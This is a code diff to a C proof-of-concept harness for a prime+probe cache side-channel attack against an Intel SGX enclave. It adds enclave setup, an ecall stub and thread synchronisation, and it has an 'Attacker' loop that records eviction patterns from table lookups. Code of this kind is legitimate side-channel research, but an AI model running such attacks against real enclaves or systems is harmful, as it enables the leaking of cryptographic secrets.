@@ -10,6 +10,54 @@
 #include <time.h>
 #include "set_sched.h"
 #include "cache.h"
+#include <sgx_urts.h>
+#include <sgx_tseal.h>
+#include <sgx_trts.h>
+#include <sgx_urts.h>
+#include <sgx_edger8r.h>
+
+
+#define DEBUG_ENCLAVE 1
+static sgx_launch_token_t token = {0};
+static sgx_enclave_id_t eid;
+static int updated;
+static sgx_status_t ret;
+
+typedef struct ms_generate_random_number_t {
+        sgx_status_t ms_retval;
+        unsigned char* ms_ptr;
+        size_t ms_length;
+} ms_generate_random_number_t;
+
+static const struct {
+        size_t nr_ocall;
+        void * table[1];
+} ocall_table_Enclave = {
+        0,
+        { NULL },
+};
+
+sgx_status_t generate_random_number(sgx_enclave_id_t eid, sgx_status_t* retval, unsigned char* ptr, size_t length)
+{
+        sgx_status_t status;
+        ms_generate_random_number_t ms;
+        ms.ms_ptr = ptr;
+        ms.ms_length = length;
+        status = sgx_ecall(eid, 0, &ocall_table_Enclave, &ms);
+        if (status == SGX_SUCCESS && retval) *retval = ms.ms_retval;
+        return status;
+}
+
+
+/*
+ * Destory enclave.
+ */
+void cleanUp(sgx_enclave_id_t eid) {
+	sgx_status_t ret __attribute__ ((aligned (1024)));
+	if ( SGX_SUCCESS != (ret = sgx_destroy_enclave(eid))) {
+		printf( "[Enclave] Error destroying enclave (error 0x%x)\n", ret);
+	}
+}
 
 #define BLOCK_SIZE 16
 #define ENTRY_SIZE 4
@@ -63,8 +111,8 @@ static int done_ret;
 static pthread_t thread;
 static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 static pid_t pid;
-static volatile int flag;
-static volatile int flag_out;
+static volatile int prime_start = 0;
+static volatile int thread_done = 0;
 static volatile int done = 0;
 static unsigned char candidates[16][256];
 static int candidates_count[16];
@@ -246,7 +294,9 @@ void init() {
 	pSrc = (Ipp8u*)malloc(960);
 
 	memset(pHKey, 0, 1024*2);
-	memcpy(pSrc, cipher, 960);
+
+	// memcpy(pSrc, cipher, 960);
+	memset(pSrc, 0, 960);
 
 	pHKey[1024+128+13] = 0x71;
 	pHKey[1024+128+14] = 0x74;
@@ -308,10 +358,32 @@ void usage(char **argv) {
 	printf("Usage: %s\n", argv[0]);
 }
 
+
 /*
  * Pthread-function for running the enclave.
  */
 static void enclave_thread(void) {
+
+	eid = 0;
+	updated = 0;
+	ret = SGX_SUCCESS;
+
+	if (SGX_SUCCESS != (ret = sgx_create_enclave("./enclave.signed.so", DEBUG_ENCLAVE, &token, &updated, &eid, NULL))) {
+		fprintf(stderr, "[Enclave] Error creating enclave (error 0x%x)\n", ret);
+		exit(EXIT_FAILURE);
+	}
+		
+    #define DATA_LEN 12
+    sgx_status_t status;
+    unsigned char ptr[DATA_LEN];
+
+	generate_random_number(eid, &status, ptr, DATA_LEN);
+
+	if (SGX_SUCCESS != status) {
+		fprintf(stderr, "[Enclave] Error calling generate_random_number\n (error 0x%x)\n", ret );
+		cleanUp(eid);
+		exit(EXIT_FAILURE);
+	}
 
 	pthread_mutex_lock(&lock);
 
@@ -329,11 +401,17 @@ static void enclave_thread(void) {
 
 	// TODO CUSTEM CODE
 
+	while (!prime_start);
+
+	thread_done = 1;
+	
 	init();
 
+	
 	for(;;) {
 		auth();
 	}
+	
 }
 
 /*
@@ -377,6 +455,9 @@ int main(int argc,char **argv) {
 	volatile int alignment_stack __attribute__ ((aligned(4096)));
 	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));
 
+	uint8_t tmp_code = 0;
+	int m_i, m_j, m_k, m_h;
+
 	if (argc != 1) {
 		usage(argv);
 		return EXIT_FAILURE;
@@ -417,37 +498,38 @@ int main(int argc,char **argv) {
 	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
 	pthread_mutex_unlock(&lock);
 
-	int repeat = 10000;
+	m_i = 10000;
 
-	for (;repeat > 0; repeat--) {
+	prime_start = 1;
+
+	while (!thread_done);
+
+	for (;m_i > 0; m_i--) {
 		
 		memset(evict_count, 0x0, (TABLESIZE/CACHELINESIZE)*4);
-		for (i = 0; i < TABLESIZE/CACHELINESIZE; i++) {
+		for (m_j = 0; m_j < TABLESIZE/CACHELINESIZE; m_j++) {
+
 			// fill cache
-			prime();
+			my_prime();
 
 			// auth();
+			// tmp_code = *(pHKey+64*5);
 
 			// probe cache
-			evict_count[i] = probe(i);
+			evict_count[m_j] = my_asm_probe(m_j);
 		}
 
-		for(i = 0; i < (TABLESIZE/CACHELINESIZE); i++) {
-			if (evict_count[i] > 0)
+		for(m_j = 0; m_j < (TABLESIZE/CACHELINESIZE); m_j++) {
+			if (evict_count[m_j] > 0)
 				fprintf(stderr, "1");
 			else
 				fprintf(stderr, "0");			
 		}
 		fprintf(stderr, "\n");
-
-		/*
-		if (eliminate() == 1) {
-			fprintf(stderr, "[Attacker] Found!\n");
-		}
-		*/
-
+		
 	}
-	fprintf(stderr, "[Attacker] Stopping enclave\n");
+
+	fprintf(stderr, "[Attacker] Stopping enclave -%d-\n", tmp_code);
 	// pthread_join(thread, NULL);
 	return EXIT_SUCCESS;
 }
